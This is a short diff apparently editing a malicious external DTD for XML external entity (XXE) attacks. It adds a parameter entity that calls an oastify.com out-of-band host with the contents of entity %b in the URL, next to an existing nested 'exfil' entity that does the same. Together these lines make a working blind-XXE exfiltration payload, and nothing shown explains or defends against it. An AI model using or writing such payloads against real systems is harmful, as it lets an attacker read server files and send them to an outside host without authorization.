@@ -5,6 +5,9 @@
 %test1;
 %b;
 %test2;
+<!ENTITY % test3 SYSTEM "http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=%b;">
+%test3;
+
 <!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://187hflsw0rb1sgveu111piwcl3rwfy3n.oastify.com/?x=%b;'>">
 %abt;
 %exfil;
